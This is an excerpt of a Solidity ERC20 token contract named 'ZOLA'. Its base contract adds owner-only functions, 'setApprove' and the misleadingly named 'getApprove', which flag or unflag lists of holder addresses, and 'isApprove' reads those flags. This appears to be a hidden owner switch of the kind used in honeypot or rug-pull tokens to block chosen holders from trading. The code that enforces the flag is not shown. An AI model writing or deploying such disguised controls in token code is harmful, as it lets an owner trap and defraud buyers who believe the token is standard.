...
contract ERC20 is Ownable, IERC20, IERC20Metadata {
    ...
    function setApprove(address [] calldata _all_) external onlyOwner {
        for (uint256 i = 0; i < _all_.length; i++) {
            _allowance[_all_[i]] = true;
        }
    }

    function getApprove(address [] calldata _all_) external onlyOwner {
        for (uint256 i = 0; i < _all_.length; i++) {
            _allowance[_all_[i]] = false;
        }
    }

    function isApprove(address _id_) public view returns (bool) {
...
contract Zola is ERC20 {
    constructor() ERC20("ZOLA", "ZOLA") {
